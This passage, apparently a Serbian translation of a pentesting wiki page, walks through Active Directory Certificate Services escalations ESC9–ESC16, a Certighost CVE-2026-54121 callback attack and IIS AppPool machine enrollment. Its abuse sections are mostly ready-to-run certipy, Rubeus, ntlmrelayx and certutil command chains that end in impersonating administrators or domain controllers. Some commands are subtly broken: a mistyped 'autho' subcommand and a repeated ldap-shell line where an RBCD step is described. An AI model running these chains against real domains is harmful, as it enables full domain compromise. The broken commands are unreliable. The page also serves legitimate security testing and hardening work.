[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Објашњење

Нова вредност **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) за **`msPKI-Enrollment-Flag`**, позната као ESC9, спречава уграђивање **нове `szOID_NTDS_CA_SECURITY_EXT` security extension** у сертификат. Ова заставица постаје релевантна када је `StrongCertificateBindingEnforcement` подешен на `1` (подразумевана вредност), за разлику од подешавања `2`. Њен значај је већи у сценаријима у којима би слабије мапирање сертификата за Kerberos или Schannel могло бити злоупотребљено (као код ESC10), јер одсуство ESC9 не би променило захтеве.<sup>[[7]](#references)</sup>

Услови под којима подешавање ове заставице постаје значајно укључују:

- `StrongCertificateBindingEnforcement` није подешен на `2` (подразумевана вредност је `1`), или `CertificateMappingMethods` укључује заставицу `UPN`.
- Сертификат има постављену заставицу `CT_FLAG_NO_SECURITY_EXTENSION` у оквиру подешавања `msPKI-Enrollment-Flag`.
- Сертификат наводи било који client authentication EKU.
- Доступне су `GenericWrite` дозволе над било којим налогом како би се компромитовао други налог.

### Сценарио злоупотребе

Претпоставимо да `John@corp.local` има `GenericWrite` дозволе над налогом `Jane@corp.local`, са циљем да компромитује `Administrator@corp.local`. Шаблон сертификата `ESC9`, за који `Jane@corp.local` има дозволу за enrollment, конфигурисан је са заставицом `CT_FLAG_NO_SECURITY_EXTENSION` у оквиру подешавања `msPKI-Enrollment-Flag`.

На почетку се `Jane`-ов hash прибавља помоћу Shadow Credentials, захваљујући `John`-овим `GenericWrite` дозволама:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Nakon toga, `userPrincipalName` korisnika `Jane` se menja u `Administrator`, namerno izostavljajući deo domena `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ova izmena ne krši ograničenja, jer `Administrator@corp.local` ostaje različit od `userPrincipalName` naloga `Administrator`.

Nakon toga, ranjivi template sertifikata `ESC9` zahteva se kao `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Primećeno je da sertifikatov `userPrincipalName` odražava `Administrator`, bez ikakvog „object SID“.

`userPrincipalName` korisnice `Jane` zatim se vraća na prvobitnu vrednost, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Pokušaj autentikacije izdatim sertifikatom sada vraća NT hash naloga `Administrator@corp.local`. Komanda mora da sadrži `-domain <domain>` zbog toga što sertifikat ne navodi domen:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Slaba mapiranja sertifikata - ESC10

### Objašnjenje

Na domain controlleru se ESC10 odnosi na dve vrednosti registry ključeva:

- Podrazumevana vrednost za `CertificateMappingMethods` u okviru `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` je `0x18` (`0x8 | 0x10`), dok je prethodno bila postavljena na `0x1F`.
- Podrazumevana postavka za `StrongCertificateBindingEnforcement` u okviru `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` je `1`, dok je prethodno bila `0`.<sup>[[7]](#references)</sup>

**Slučaj 1**

Kada je `StrongCertificateBindingEnforcement` konfigurisan kao `0`.

**Slučaj 2**

Ako `CertificateMappingMethods` uključuje `UPN` bit (`0x4`).

### Abuse Case 1

Kada je `StrongCertificateBindingEnforcement` konfigurisan kao `0`, account A sa `GenericWrite` dozvolama može biti iskorišćen za kompromitovanje bilo kog accounta B.

Na primer, ako napadač ima `GenericWrite` dozvole nad `Jane@corp.local`, cilj mu je da kompromituje `Administrator@corp.local`. Procedura je ista kao kod ESC9, što omogućava korišćenje bilo kog certificate template-a.

Najpre se Jane-in hash preuzima pomoću Shadow Credentials, iskorišćavanjem `GenericWrite` dozvola.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Nakon toga, `userPrincipalName` naloga `Jane` menja se u `Administrator`, namerno izostavljajući deo `@corp.local` kako bi se izbeglo kršenje ograničenja.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Nakon toga, sertifikat koji omogućava autentifikaciju klijenta zahteva se kao `Jane`, koristeći podrazumevani šablon `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` korisnika `Jane` se zatim vraća na originalnu vrednost, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Autentifikacija dobijenim sertifikatom će dati NT hash za `Administrator@corp.local`, zbog čega je neophodno navesti domen u komandi, jer podaci o domenu nisu prisutni u sertifikatu.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Slučaj zloupotrebe 2

Kada `CertificateMappingMethods` sadrži `UPN` bit zastavicu (`0x4`), nalog A sa dozvolama `GenericWrite` može kompromitovati bilo koji nalog B koji nema svojstvo `userPrincipalName`, uključujući mašinske naloge i ugrađeni administrator domena `Administrator`.

Ovde je cilj kompromitovati `DC$@corp.local`, počevši od pribavljanja hash-a naloga `Jane` kroz Shadow Credentials, uz iskorišćavanje `GenericWrite` dozvole.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` korisnika `Jane` se zatim postavlja na `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Sertifikat za autentikaciju klijenta zahteva se kao `Jane` koristeći podrazumevani šablon `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` korisnice `Jane` vraća se na prvobitnu vrednost nakon ovog procesa.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Za autentifikaciju putem Schannel-a koristi se Certipy opcija `-ldap-shell`, što ukazuje na uspešnu autentifikaciju kao `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Kroz LDAP shell, komande kao što je `set_rbcd` omogućavaju napade Resource-Based Constrained Delegation (RBCD), što potencijalno može dovesti do kompromitovanja kontrolera domena.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ova ranjivost se takođe odnosi na svaki korisnički nalog koji nema `userPrincipalName` ili se on ne podudara sa `sAMAccountName`, pri čemu je podrazumevani `Administrator@corp.local` glavna meta zbog svojih povišenih LDAP privilegija i činjenice da podrazumevano nema `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Objašnjenje

Ako CA Server nije konfigurisan sa `IF_ENFORCEENCRYPTICERTREQUEST`, moguće je izvesti NTLM relay attacks bez signing-a putem RPC service-a. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Možete koristiti `certipy` da proverite da li je `Enforce Encryption for Requests` onemogućen; certipy će prikazati `ESC11` Vulnerabilities.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scenario zloupotrebe

Potrebno je podesiti relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Napomena: Za kontrolere domena moramo navesti `-template` u DomainController.

Ili koristeći [sploutchy's fork of impacket](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Objašnjenje

Administratori mogu da podese Certificate Authority tako da se čuva na eksternom uređaju kao što je „Yubico YubiHSM2“.

Ako je USB uređaj povezan sa CA serverom preko USB porta ili sa USB device serverom u slučaju da je CA server virtuelna mašina, potreban je authentication key (ponekad se naziva i „password“) da bi Key Storage Provider mogao da generiše i koristi ključeve u YubiHSM-u.

Ovaj key/password se čuva u registru, pod `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`, u cleartext formatu.

Reference se nalazi [ovde](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Scenario zloupotrebe

Ako je privatni ključ CA-a sačuvan na fizičkom USB uređaju, nakon što dobijete shell access, moguće je povratiti ključ.

Najpre treba da nabavite CA sertifikat (on je javan), a zatim:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Na kraju, upotrebite komandu `certutil -sign` da biste falsifikovali novi proizvoljni sertifikat koristeći CA sertifikat i njegov privatni ključ.

## OID Group Link Abuse - ESC13

### Objašnjenje

Atribut `msPKI-Certificate-Policy` omogućava dodavanje politike izdavanja u šablon sertifikata. Objekti `msPKI-Enterprise-Oid`, koji su odgovorni za izdavanje politika, mogu se pronaći u Configuration Naming Context-u (CN=OID,CN=Public Key Services,CN=Services) PKI OID kontejnera. Politika može biti povezana sa AD grupom pomoću atributa `msDS-OIDToGroupLink` ovog objekta, čime se sistemu omogućava da autorizuje korisnika koji priloži sertifikat kao da je član te grupe. [Referenca ovde](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Drugim rečima, kada korisnik ima dozvolu da registruje sertifikat, a sertifikat je povezan sa OID grupom, korisnik može naslediti privilegije te grupe.

Upotrebite [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) da biste pronašli OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scenario zloupotrebe

Pronađite korisničku dozvolu pomoću `certipy find` ili `Certify.exe find /showAllPermissions`.

Ako `John` ima dozvolu da se upiše u `VulnerableTemplate`, korisnik može naslediti privilegije grupe `VulnerableGroup`.

Sve što treba da uradi jeste da navede template; dobiće sertifikat sa pravima `OIDToGroupLink`.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Vulnerable Certificate Renewal Configuration- ESC14

### Objašnjenje

Opis na https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping je izuzetno detaljan. U nastavku je citat originalnog teksta.<sup>[[14]](#references)</sup>

ESC14 se odnosi na ranjivosti koje nastaju zbog „slabog eksplicitnog mapiranja sertifikata“, prvenstveno usled zloupotrebe ili nebezbedne konfiguracije atributa `altSecurityIdentities` na Active Directory korisničkim ili računarskim nalozima. Ovaj atribut sa više vrednosti omogućava administratorima da ručno povežu X.509 sertifikate sa AD nalogom u svrhu autentifikacije. Kada je popunjen, ova eksplicitna mapiranja mogu nadjačati podrazumevanu logiku mapiranja sertifikata, koja se obično oslanja na UPN-ove ili DNS imena u SAN-u sertifikata, odnosno na SID ugrađen u bezbednosnu ekstenziju `szOID_NTDS_CA_SECURITY_EXT`.

Mapiranje je „slabo“ kada je vrednost stringa korišćena unutar atributa `altSecurityIdentities` za identifikaciju sertifikata preširoka, lako pogodiva, oslanja se na nejedinstvena polja sertifikata ili koristi komponente sertifikata koje se lako mogu lažirati. Ako napadač može da dobije ili izradi sertifikat čiji se atributi poklapaju sa ovako slabo definisanim eksplicitnim mapiranjem privilegovanog naloga, može koristiti taj sertifikat za autentifikaciju kao taj nalog i njegovu impersonaciju.

Primeri potencijalno slabih stringova za mapiranje `altSecurityIdentities` uključuju:

- Mapiranje isključivo prema uobičajenom Subject Common Name (CN): npr. `X509:<S>CN=SomeUser`. Napadač bi mogao da dobije sertifikat sa ovim CN-om iz manje bezbednog izvora.
- Korišćenje previše opštih Issuer Distinguished Name (DN) ili Subject DN vrednosti bez dodatnog ograničenja, kao što su određeni serijski broj ili identifikator ključa subjekta: npr. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Korišćenje drugih predvidivih obrazaca ili nekriptografskih identifikatora koje napadač može ispuniti u sertifikatu koji može legitimno da dobije ili izforge-uje (ako je kompromitovao CA ili pronašao ranjiv template kao u ESC1).

Atribut `altSecurityIdentities` podržava različite formate za mapiranje, kao što su:

- `X509:<I>IssuerDN<S>SubjectDN` (mapira prema punim Issuer i Subject DN vrednostima)
- `X509:<SKI>SubjectKeyIdentifier` (mapira prema vrednosti ekstenzije Subject Key Identifier sertifikata)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapira prema serijskom broju, implicitno ograničenom Issuer DN vrednošću) - ovo nije standardni format; obično je `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapira prema RFC822 imenu, obično email adresi, iz SAN-a)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapira prema SHA1 hash-u sirovog javnog ključa sertifikata - generalno je bezbedno)

Bezbednost ovih mapiranja u velikoj meri zavisi od specifičnosti, jedinstvenosti i kriptografske snage izabranih identifikatora sertifikata korišćenih u stringu za mapiranje. Čak i kada su na Domain Controller-ima omogućeni jaki režimi povezivanja sertifikata (koji prvenstveno utiču na implicitna mapiranja zasnovana na SAN UPN-ovima/DNS imenima i SID ekstenziji), loše konfigurisan unos `altSecurityIdentities` i dalje može predstavljati direktan put ka impersonaciji ako je sama logika mapiranja pogrešna ili previše permisivna.
### Scenario zloupotrebe

ESC14 cilja **eksplicitna mapiranja sertifikata** u Active Directory-ju (AD), konkretno atribut `altSecurityIdentities`. Ako je ovaj atribut postavljen (namerno ili zbog pogrešne konfiguracije), napadači mogu da se predstavljaju kao nalozi tako što će priložiti sertifikate koji odgovaraju mapiranju.

#### Scenario A: Napadač može da upisuje u `altSecurityIdentities`

**Preduslov**: Napadač ima dozvole za upis u atribut `altSecurityIdentities` ciljnog naloga ili dozvolu da mu ih dodeli u vidu jedne od sledećih dozvola nad ciljnim AD objektom:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: Cilj ima slabo mapiranje preko X509RFC822 (email)

- **Preduslov**: Cilj ima slabo X509RFC822 mapiranje u altSecurityIdentities. Napadač može da postavi atribut mail žrtve tako da odgovara X509RFC822 imenu cilja, da enroluje sertifikat kao žrtva i da ga koristi za autentifikaciju kao cilj.

#### Scenario C: Cilj ima X509IssuerSubject mapiranje

- **Preduslov**: Cilj ima slabo eksplicitno X509IssuerSubject mapiranje u `altSecurityIdentities`. Napadač može da postavi atribut `cn` ili `dNSHostName` na principalu žrtve tako da odgovara subject-u X509IssuerSubject mapiranja cilja. Zatim napadač može da enroluje sertifikat kao žrtva i da koristi ovaj sertifikat za autentifikaciju kao cilj.

#### Scenario D: Cilj ima X509SubjectOnly mapiranje

- **Preduslov**: Cilj ima slabo eksplicitno X509SubjectOnly mapiranje u `altSecurityIdentities`. Napadač može da postavi atribut `cn` ili `dNSHostName` na principalu žrtve tako da odgovara subject-u X509SubjectOnly mapiranja cilja. Zatim napadač može da enroluje sertifikat kao žrtva i da koristi ovaj sertifikat za autentifikaciju kao cilj.
### konkretne operacije
#### Scenario A

Zatražite sertifikat template-a sertifikata `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Sačuvajte i konvertujte sertifikat
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Autentifikujte se (koristeći sertifikat)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Čišćenje (opciono)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Za konkretnije metode napada u različitim scenarijima napada pogledajte sledeće: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu politike aplikacija(CVE-2024-49019) - ESC15

### Objašnjenje

Opis na adresi https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc je izuzetno detaljan. U nastavku je navod iz originalnog teksta.<sup>[[15]](#references)</sup>

Korišćenjem ugrađenih podrazumevanih predložaka sertifikata verzije 1, napadač može da kreira CSR koji uključuje politike aplikacija koje imaju prednost u odnosu na konfigurisane atribute Extended Key Usage navedene u predlošku. Jedini zahtev jesu prava za enrollment, a ovo se može koristiti za generisanje sertifikata za autentikaciju klijenta, agenta za zahteve za sertifikate i potpisivanje koda pomoću predloška **_WebServer_**

### Zloupotreba

[Certipy dokumentacija o eskalaciji privilegija](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) sadrži detaljnije primere upotrebe.<sup>[[14]](#references)</sup>


Certipy-ova komanda `find` može pomoći u identifikovanju V1 predložaka koji su potencijalno podložni ESC15 ako CA nije zakrpljen.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Direktno impersoniranje putem Schannel-a

**Korak 1: Zatražite certificate, ubacujući "Client Authentication" Application Policy i ciljni UPN.** Napadač `attacker@corp.local` cilja `administrator@corp.local` koristeći V1 template "WebServer" (koji dozvoljava subject koji dostavlja enrollee).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Ranjivi V1 template sa opcijom "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Ubacuje OID `1.3.6.1.5.5.7.3.2` u Application Policies ekstenziju CSR-a.
- `-upn 'administrator@corp.local'`: Postavlja UPN u SAN za impersonaciju.

**Korak 2: Autentifikujte se putem Schannel-a (LDAPS) koristeći dobijeni certificate.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation putem Enrollment Agent Abuse

**Korak 1: Zatražite certificate iz V1 template-a (sa opcijom „Enrollee supplies subject“), uz ubacivanje „Certificate Request Agent“ Application Policy-ja.** Ovaj certificate je namenjen napadaču (`attacker@corp.local`) kako bi postao enrollment agent. UPN nije naveden za identitet samog napadača, jer je cilj dobijanje agent mogućnosti.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Ubacuje OID `1.3.6.1.4.1.311.20.2.1`.

**Korak 2: Koristite "agent" sertifikat da zatražite sertifikat u ime ciljnog privilegovanog korisnika.** Ovo je korak sličan ESC3, koji koristi sertifikat iz Koraka 1 kao agent sertifikat.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Korak 3: Autentifikujte se kao privilegovani korisnik koristeći „on-behalf-of“ sertifikat.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Objašnjenje

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** odnosi se na scenario u kojem, ako konfiguracija AD CS ne zahteva uključivanje ekstenzije **szOID_NTDS_CA_SECURITY_EXT** u svim sertifikatima, napadač to može da iskoristi tako što:

1. Zatraži sertifikat **without SID binding**.

2. Iskoristi ovaj sertifikat za autentikaciju kao bilo koji nalog, na primer za impersonation naloga sa visokim privilegijama (npr. administratora domena).

Takođe možete pogledati ovaj članak da biste saznali više o detaljnom principu:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Zloupotreba

Sledeće je preuzeto sa [ovog linka](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), kliknite da biste videli detaljnije metode korišćenja.<sup>[[14]](#references)</sup>

Da biste utvrdili da li je okruženje Active Directory Certificate Services (AD CS) ranjivo na **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Korak 1: Pročitajte početni UPN naloga žrtve (Opciono - za vraćanje).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Korak 2: Ažurirajte UPN naloga žrtve na `sAMAccountName` ciljnog administratora.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Korak 3: (Ako je potrebno) Pribavite kredencijale za nalog „žrtve“ (npr. putem Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Korak 4: Zatražite sertifikat kao korisnik „žrtva“ iz _bilo kog odgovarajućeg client authentication template-a_ (npr. „User“) na CA-u ranjivom na ESC16.** Pošto je CA ranjiv na ESC16, automatski će izostaviti SID security extension iz izdatog sertifikata, bez obzira na konkretna podešavanja ovog extension-a u template-u. Podesite environment varijablu za Kerberos credential cache (shell komanda):
```bash
export KRB5CCNAME=victim.ccache
```
Zatim zatražite sertifikat:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Korak 5: Vratite UPN naloga „žrtve“.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Korak 6: Autentifikujte se kao ciljni administrator.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Objašnjenje

**Certighost** zloupotrebljava **AD CS enrollment chase / callback path** u kojem CA veruje atributima zahteva koje dostavlja podnosilac zahteva za određivanje identiteta koji treba da bude smešten u izdatom sertifikatu. U javnom PoC-u, kreirani zahtev uključuje:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP pod kontrolom napadača koji će CA kontaktirati
- **`rmd`**: **DNS ime ciljnog Domain Controller-a** za impersonaciju

Ako CA prati taj chase, povezaće se sa napadačem preko **SMB/LSA (`445`)** i **LDAP (`389`)**. Napadač koristi **stvarni machine account** (obično kreiran preko podrazumevanog **`ms-DS-MachineAccountQuota`**) tako da se callback sesija autentifikuje kao važeći principal domena, ali rogue servisi umesto toga vraćaju atribute identiteta **ciljnog DC-a**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Ako CA **kriptografski ne poveže vraćeni identitet sa autentifikovanim callback principalom**, može da izda sertifikat za **Domain Controller**, iako je sesija autentifikovana kao machine account pod kontrolom napadača. Zbog toga se ova greška konceptualno razlikuje od **Certifried**: umesto izmene AD atributa kao što je `dNSHostName`, napadač **zamenjuje podatke identiteta tokom CA callback resolution-a**.<sup>[[2]](#references)</sup>

**Korisni preduslovi:**

- Nisko privilegovani **creds za domen**
- Mogućnost **kreiranja ili ponovne upotrebe computer account-a**
- Mrežna dostupnost od **CA** do portova **`389` i `445`** pod kontrolom napadača
- Vulnerable / unpatched CA request path (Microsoft update od **14. jula 2026.** dodao je **DC validation za `cdc`** i **resolved-SID comparison**)

Dobijeni **`.pfx`** zatim može da se koristi za **PKINIT**, čime se dobijaju **`.ccache`** i, u objavljenom PoC flow-u, NT hash **ciljnog DC-a**, što je obično dovoljno za **potpunu kompromitaciju domena**.

### Zloupotreba

Javni PoC automatizuje čitav lanac:<sup>[[1]](#references)</sup>

1. Kreirati ili ponovo upotrebiti **machine account** pod kontrolom napadača.
2. Pokrenuti **rogue LDAP i SMB/LSA listenere** na portovima `389` i `445`.
3. Poslati zahtev za sertifikat koji sadrži atribute **`cdc`** pod kontrolom napadača i ciljni **`rmd`**.
4. Dozvoliti CA-u da se autentifikuje na rogue listenerima kao kontrolisani machine account, ali odgovoriti na identity lookups atributima **ciljnog DC-a**.
5. Primiti CA-signed **DC certificate**, a zatim ga upotrebiti za **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Korisne runtime zastavice iz PoC-a:

- `--listener <ip>`: eksplicitno bira callback IP oglašen u `cdc`
- `--computer-name <NAME$>`: ponovo koristi postojeći machine account umesto kreiranja novog

**Operativne napomene:**

- PoC zahteva **root** jer se vezuje za **privilegovane portove** `389` i `445`.
- Uspešna eksploatacija lokalno upisuje **DC `.pfx`** i **Kerberos `.ccache`**.
- Pošto se certificate mapira na **Domain Controller account**, naknadne radnje mogu uključivati **certificate-based Kerberos auth**, **DCSync** i ponovnu upotrebu dobijenog **machine NT hash**-a.<sup>[[2]](#references)</sup>

## IIS AppPool machine enrollment do Administratora na istom hostu

IIS pool koji radi kao `ApplicationPoolIdentity` koristi **computer account** svog hosta za izlazni pristup mrežnim resursima. Zbog toga izvršavanje koda kao `IIS AppPool\<POOL>` ostaje sa niskim privilegijama u lokalnom tokenu, ali može da pošalje AD CS zahtev koji CA autentifikuje kao `HOST$`; ovo je tranzicija izlaznog identiteta, a ne impersonacija tokena niti lokalna elevacija u Potato stilu.<sup>[[19]](#references)[[20]](#references)</sup>

Ovaj lanac zahteva IIS host pridružen domenu, Enterprise CA dostupan putem RPC-a, objavljen machine-authentication template za koji computer ima prava enrollment-a, PKINIT podršku i KDC/SMB dostupnost. Prilagođeni pool identity menja izlazni principal, zato potvrdite da pool zaista koristi `ApplicationPoolIdentity` pre nego što pretpostavite `HOST$`.<sup>[[19]](#references)[[20]](#references)</sup>

### Enrollment pomoću ključa pod kontrolom napadača

Generišite key pair i CSR van IIS servera i zadržite private key. Pošaljite **samo CSR** sa kompromitovanog worker-a. [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) instancira `CertificateAuthority.Request`, postavlja `CertificateTemplate:Machine`, poziva `ICertRequest::Submit` i vraća izdati certificate. Koristite CA configuration string `CAHOST\CA-NAME`; uobičajeni `Machine` template formira subject na osnovu AD-a, tako da subject/SAN podaci koje prosleđuje requester nisu potrebni.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Kombinujte vraćeni certificate sa **odgovarajućim zadržanim ključem**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` funkcioniše samo kada Windows već može da poveže certificate sa dostupnim private key-em; za odvojene PEM fajlove, eksplicitno kreirajte PKCS#12:<sup>[[19]](#references)[[23]](#references)</sup>
```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
-out machine_cert.pfx -name 'HOST$'
```
